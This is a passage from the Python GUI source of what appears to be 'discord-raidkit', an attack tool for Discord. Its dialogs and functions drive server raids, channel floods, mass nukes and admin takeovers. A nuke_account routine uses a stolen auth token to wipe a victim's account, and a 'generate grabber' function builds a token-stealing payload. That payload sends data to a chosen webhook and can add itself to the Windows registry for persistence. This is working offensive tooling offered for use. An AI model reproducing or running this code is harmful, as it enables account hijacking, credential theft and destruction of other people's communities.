            }
            r = requests.get(
                "https://discord.com/api/v6/users/@me",
                headers=headers
            )
            if r.status_code == 200:

                # Attempt to IDs of guilds from settings response (used to make account leave every guild).

                headers = {
                    "Authorization": token,
                    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.75 Safari/537.36",
                    "X-Requested-With": "XMLHttpRequest"
                }

                url = "https://discord.com/api/v8/users/@me/settings"
                r = requests.get(url, headers=headers)
                guild_IDs = r.json()['guild_positions']
                nuke_requests(headers)
                self.osiris_btns_off(False)
                self.page_btns_off(False)
                osiris_running = False
            else:
                self.txtOUserID.setText("Nuke Account Fail: Invalid Token")
                self.txtOUsername.setText("Nuke Account Fail: Invalid Token")
                self.txtO2FA.setText("Nuke Account Fail: Invalid Token")
                self.txtOEmail.setText("Nuke Account Fail: Invalid Token")
                self.txtOPhoneNum.setText("Nuke Account Fail: Invalid Token")
                self.osiris_btns_off(False)
                self.page_btns_off(False)
                osiris_running = False
        except BaseException as e:
            logging.error(f"O: nuke_account(): {e}")
            self.osiris_btns_off(False)
            self.page_btns_off(False)
            osiris_running = False
    
    def generate_grabber(self) -> None:
        global osiris_running
        osiris_running = True
        self.osiris_btns_off(True)
        self.page_btns_off(True)
        dlg = PayloadDialog()
        dlg.show()
        dlg.exec()
        if webhook == "False" or folder == "False" or rpayload == "False" or hpayload == "False":
            self.osiris_btns_off(False)
            self.page_btns_off(False)
            osiris_running = False
            dlg = WindowsNoticeDialog()
            dlg.show()
            dlg.exec()
            return
        try:
            code = dru.get_generate_code(webhook, folder, hpayload, do_reg_key)
            dru.write_payload(code, rpayload)
            self.osiris_btns_off(False)
            self.page_btns_off(False)
            osiris_running = False
        except BaseException as e:
            logging.error(f"O: login(): {e}")
            self.osiris_btns_off(False)
            self.page_btns_off(False)
            osiris_running = False


# Input Dialogs

class NicknamesDialog(QtWidgets.QDialog, Ui_dlgNicknames):
    """Nicknames Dialog; used in the Nick All command.
    """

    def __init__(self, parent=None) -> None:
        super().__init__(parent)
        self.ui = Ui_dlgNicknames()
        self.setupUi(self)
        self.accepted.connect(lambda: self.set_nicks(True))
        self.rejected.connect(lambda: self.set_nicks(False))

    def set_nicks(self, boolean) -> None:
        global nicks
        global guild_ID
        if boolean:
            try:
                guild_ID = int(self.txtGuildID.text().strip())
                nicks = self.txtNicknames.text().strip().split("\,")
                for i in range(len(nicks)):
                    if nicks[i] == "":
                        del nicks[i]
                if nicks == []:
                    guild_ID = 0
                self.close()
            except:
                guild_ID = 0
                nicks = []
                self.close()
        else:
            guild_ID = 0
            nicks = []
            self.close()


class MessagesDialog(QtWidgets.QDialog, Ui_dlgMessages):
    """Messages Dialog; used in the Msg All command.
    """

    def __init__(self, parent=None) -> None:
        super().__init__(parent)
        self.ui = Ui_dlgMessages()
        self.setupUi(self)
        self.accepted.connect(lambda: self.set_messages(True))
        self.rejected.connect(lambda: self.set_messages(False))

    def set_messages(self, boolean) -> None:
        global messages
        global guild_ID
        if boolean:
            try:
                guild_ID = int(self.txtGuildID.text().strip())
                messages = self.txtMessages.text().strip().split("\,")
                for i in range(len(messages)):
                    if messages[i] == "":
                        del messages[i]
                if messages == []:
                    guild_ID = []
                self.close()
            except:
                guild_ID = 0
                messages = []
                self.close()
        else:
            guild_ID = 0
            messages = []
            self.close()


class ServerDialog(QtWidgets.QDialog, Ui_dlgServer):
    """Server Dialog; used in various commands.
    """

    def __init__(self, parent=None) -> None:
        super().__init__(parent)
        self.ui = Ui_dlgServer()
        self.setupUi(self)
        self.accepted.connect(lambda: self.set_server(True))
        self.rejected.connect(lambda: self.set_server(False))

    def set_server(self, boolean) -> None:
        global guild_ID
        if boolean:
            try:
                guild_ID = int(self.txtGuildID.text().strip())
            except:
                guild_ID = 0
            self.close()
        else:
            guild_ID = 0
            self.close()


class AdminDialog(QtWidgets.QDialog, Ui_dlgAdmin):
    """Admin Dialog; used in the admin command.
    """

    def __init__(self, parent=None) -> None:
        super().__init__(parent)
        self.ui = Ui_dlgAdmin()
        self.setupUi(self)
        self.accepted.connect(lambda: self.set_admin(True))
        self.rejected.connect(lambda: self.set_admin(False))

    def set_admin(self, boolean) -> None:
        global guild_ID
        global user_ID
        global rolename
        if boolean:
            try:
                guild_ID = int(self.txtGuildID.text().strip())
                user_ID = int(self.txtUserID.text().strip())
                rolename = self.txtRolename.text().strip()
                if not rolename:
                    guild_ID = 0
                    user_ID = 0
                self.close()
            except:
                guild_ID = 0
                user_ID = 0
                rolename = ""
                self.close()
        else:
            guild_ID = 0
            user_ID = 0
            rolename = ""
            self.close()


class CfloodDialog(QtWidgets.QDialog, Ui_dlgCflood):
    """Cflood Dialog; used in the Cflood command.
    """

    def __init__(self, parent=None) -> None:
        super().__init__(parent)
        self.ui = Ui_dlgCflood()
        self.setupUi(self)
        self.accepted.connect(lambda: self.set_flood(True))
        self.rejected.connect(lambda: self.set_flood(False))

    def set_flood(self, boolean) -> None:
        global guild_ID
        global channel_num
        global channel_names
        if boolean:
            try:
                guild_ID = int(self.txtGuildID.text().strip())
                channel_names = self.txtChannelNames.text().strip().split("\,")
                channel_num = self.sbChannelNum.value()
                if not guild_ID or not channel_names:
                    guild_ID = 0
                    channel_num = 0
                    channel_names = []
                self.close()
            except:
                guild_ID = 0
                channel_num = 0
                channel_names = []
                self.close()
        else:
            guild_ID = 0
            channel_num = 0
            channel_names = []
            self.close()


class RaidDialog(QtWidgets.QDialog, Ui_dlgRaid):
    """Raid Dialog; used in the raid command.
    """

    def __init__(self, parent=None) -> None:
        super().__init__(parent)
        self.ui = Ui_dlgRaid()
        self.setupUi(self)
        self.accepted.connect(lambda: self.set_raid(True))
        self.rejected.connect(lambda: self.set_raid(False))

    def set_raid(self, boolean) -> None:
        global guild_ID
        global rolename
        global nicks
        global channel_names
        global channel_num
        global messages
        if boolean:
            try:
                guild_ID = int(self.txtGuildID.text().strip())
                nicks = self.txtNicknames.text().strip().split("\,")
                channel_names = self.txtChannelNames.text().strip().split("\,")
                channel_num = int(self.txtChannelNum.text().strip())
                messages = self.txtMessages.text().strip().split("\,")
                for i in range(len(nicks)):
                    if nicks[i] == "":
                        del nicks[i]
                for i in range(len(channel_names)):
                    if channel_names[i] == "":
                        del channel_names[i]
                for i in range(len(messages)):
                    if messages[i] == "":
                        del messages[i]
                if not guild_ID \
                    or not nicks \
                    or not channel_names \
                    or not channel_num or \
                    not messages:
                    guild_ID = 0
                    channel_num = 0
                self.close()
            except:
                guild_ID = 0
                nicks = []
                channel_names = []
                channel_num = 0
                messages = []
                self.close()
        else:
            guild_ID = 0
            nicks = []
            channel_names = []
            channel_num = 0
            messages = []
            self.close()


class NukeDialog(QtWidgets.QDialog, Ui_dlgNuke):
    """Nuke Dialog; used in the nuke command.
    """

    def __init__(self, parent=None) -> None:
        super().__init__(parent)
        self.ui = Ui_dlgNuke()
        self.setupUi(self)
        self.accepted.connect(lambda: self.set_nuke(True))
        self.rejected.connect(lambda: self.set_nuke(False))

    def set_nuke(self, boolean) -> None:
        global user_IDs
        global guild_ID
        if boolean:
            try:
                guild_ID = int(self.txtGuildID.text().strip())
                user_IDs = self.txtExclusions.text().strip().split("\,")
                for i in range(len(user_IDs)):
                    if user_IDs[i] == "":
                        del user_IDs[i]
                if user_IDs:
                    temp = []
                    for ID in user_IDs:
                        temp.append(int(ID))
                    user_IDs = temp
                self.close()
            except:
                guild_ID = 0
                user_IDs = []
                self.close()
        else:
            guild_ID = 0
            user_IDs = []
            self.close()


class MassNukeDialog(QtWidgets.QDialog, Ui_dlgMassNuke):
    """Mass Nuke Dialog; used in the Mass Nuke command.
    """

    def __init__(self, parent=None) -> None:
        super().__init__(parent)
        self.ui = Ui_dlgMassNuke()
        self.setupUi(self)
        self.accepted.connect(lambda: self.set_mass_nuke(True))
        self.rejected.connect(lambda: self.set_mass_nuke(False))

    def set_mass_nuke(self, boolean) -> None:
        global user_IDs
        global stop_mass_nuke
        if boolean:
            try:
                user_IDs = self.txtExclusions.text().strip().split("\,")
                for i in range(len(user_IDs)):
                    if user_IDs[i] == "":
                        del user_IDs[i]
                if user_IDs:
                    temp = []
                    for ID in user_IDs:
                        temp.append(int(ID))
                    user_IDs = temp
                stop_mass_nuke = False
                self.close()
            except:
                stop_mass_nuke = True
                user_IDs = []
                self.close()
        else:
            stop_mass_nuke = True
            user_IDs = []
            self.close()


class ConfirmationDialog(QtWidgets.QDialog, Ui_dlgConfirmation):
    """Confirmation Dialog; used in the Mass Leave command.
    """

    def __init__(self, parent=None) -> None:
        super().__init__(parent)
        self.ui = Ui_dlgConfirmation()
        self.setupUi(self)
        self.accepted.connect(lambda: self.confirm(True))
        self.rejected.connect(lambda: self.confirm(False))

    def confirm(self, boolean) -> None:
        global leave_confirmation
        if boolean:
            leave_confirmation = True
            self.close()
        else:
            leave_confirmation = False
            self.close()


class TokenDialog(QtWidgets.QDialog, Ui_dlgToken):
    """Token Dialog; used in various osiris commands.
    """

    def __init__(self, parent=None) -> None:
        super().__init__(parent)
        self.ui = Ui_dlgToken()
        self.setupUi(self)
        self.accepted.connect(lambda: self.set_token(True))
        self.rejected.connect(lambda: self.set_token(False))

    def set_token(self, boolean) -> None:
        global token
        if boolean:
            try:
                token = self.txtAuthToken.text().strip()
                self.close()
            except:
                token = ""
                self.close()
        else:
            token = "False"
            self.close()


class PayloadDialog(QtWidgets.QDialog, Ui_dlgPayload):
    """Payload Dialog; used in osiris generate grabber command.
    """
    def __init__(self, parent=None) -> None:
        super().__init__(parent)
        self.ui = Ui_dlgPayload()
        self.setupUi(self)
        self.accepted.connect(lambda: self.set_payload(True))
        self.rejected.connect(lambda: self.set_payload(False))

    def set_payload(self, boolean) -> None:
        global webhook
        global folder
        global rpayload
        global hpayload
        global do_reg_key
        if boolean:
            try:
                webhook = self.txtWebhook.text().strip()
                folder = self.txtFolderName.text().strip()
                rpayload = self.txtRPayloadName.text().strip()
                hpayload = self.txtHPayloadName.text().strip()

                if self.chkAddToRegistry.isChecked():
                    do_reg_key = True
                else:
                    do_reg_key = False

                # If any of these six lines of code throw an error, input is wrong

                os.mkdir(folder)
                os.rmdir(folder)
                open(rpayload + ".txt", "w").close()
                os.remove(rpayload + ".txt")
                open(hpayload + ".txt", "w").close()
                os.remove(hpayload + ".txt")

                self.close()
            except:
                webhook = "False"
                folder = "False"
                rpayload = "False"
                hpayload = "False"
                self.close()
        else:
            webhook = "False"
            folder = "False"
            rpayload = "False"
            hpayload = "False"
            self.close()


class NewUpdateDialog(QtWidgets.QDialog, Ui_dlgNewUpdate):
    """New Update Dialogue: used to inform the user of a new update.
    """

    def __init__(self, parent=None) -> None:
        super().__init__(parent)
        self.ui = Ui_dlgNewUpdate()
        self.setupUi(self)

        self.accepted.connect(lambda: self.view_update(True))
        self.rejected.connect(lambda: self.view_update(False))

    def view_update(self, boolean) -> None:
        global launched
        global launch_after_yes
        if boolean:
            launched = True
            if self.cbOpenDR.isChecked():
                launch_after_yes = True
            webbrowser.open(
                "https://github.com/the-cult-of-integral/discord-raidkit/releases/latest", new=2)
            self.close()
        else:
            self.close()


# Error Dialogues

class ImproperTokenDialog(QtWidgets.QDialog, Ui_dlgImproperToken):
    """Improper Token Dialog; used to inform user of improper tokens.
    """

    def __init__(self, parent=None) -> None:
        super().__init__(parent)
        self.ui = Ui_dlgToken()
        self.setupUi(self)
        self.accepted.connect(lambda: self.exiter(True))
        self.rejected.connect(lambda: self.exiter(True))

    def exiter(self, boolean) -> None:
        self.close()


class WindowsNoticeDialog(QtWidgets.QDialog, Ui_dlgWindowsNotice):
    """Windows Notice Dialog; used to inform user of invalid file/folder names.
    """

    def __init__(self, parent=None) -> None:
        super().__init__(parent)
        self.ui = Ui_dlgToken()
        self.setupUi(self)
        self.accepted.connect(lambda: self.exiter(True))
        self.rejected.connect(lambda: self.exiter(True))

    def exiter(self, boolean) -> None:
        self.close()


class TaskStillRunningDialog(QtWidgets.QDialog, Ui_dlgTaskStillRunning):
    """Task Still Running Dialog; used to inform user of running tasks when
    exiting the application; prevents exit until running tasks are closed.
    """

    def __init__(self, parent=None) -> None:
        super().__init__(parent)
        self.ui = Ui_dlgToken()
        self.setupUi(self)
        self.accepted.connect(lambda: self.exiter(True))
        self.rejected.connect(lambda: self.exiter(True))

    def exiter(self, boolean) -> None:
        self.close()


# Clients

class Anubis(commands.Bot):
    def __init__(self, intents, command_prefix, self_bot) -> None:
        commands.Bot.__init__(
            self,
            command_prefix=command_prefix,
            intents=intents,
            self_bot=self_bot
        )
        self.remove_command("help")
        self.status = cycle(
            [
                f"{command_prefix}help"
            ]
        )

    async def on_ready(self) -> None:
        global bot_starting
        bot_starting = False
        self.change_status.start()

    @tasks.loop(seconds=10)
    async def change_status(self) -> None:
        await self.change_presence(activity=discord.Game(next(self.status)))


class Qetesh(commands.Bot):
    def __init__(self, intents, command_prefix, self_bot) -> None:
        commands.Bot.__init__(
            self,
            command_prefix=command_prefix,
            intents=intents,
            self_bot=self_bot
        )
        self.remove_command("help")
        self.status = cycle(
            [
                f"{command_prefix}help"
            ]
        )

    async def on_ready(self) -> None:
        global bot_starting
        bot_starting = False
        self.change_status.start()

    @tasks.loop(seconds=10)
    async def change_status(self) -> None:
        await self.change_presence(activity=discord.Game(next(self.status)))


def main() -> None:
    global configuration
    configuration = dru.do_config_setup(CONFIG_PATH)
    app = QtWidgets.QApplication(sys.argv)
    app.setStyleSheet(qdarktheme.load_stylesheet(configuration["theme"]))
    loop = QEventLoop(app)
    asyncio.set_event_loop(loop)
    w = MainWindow()
    w.show()
    loop.run_forever()
    return


if __name__ == "__main__":
    main()
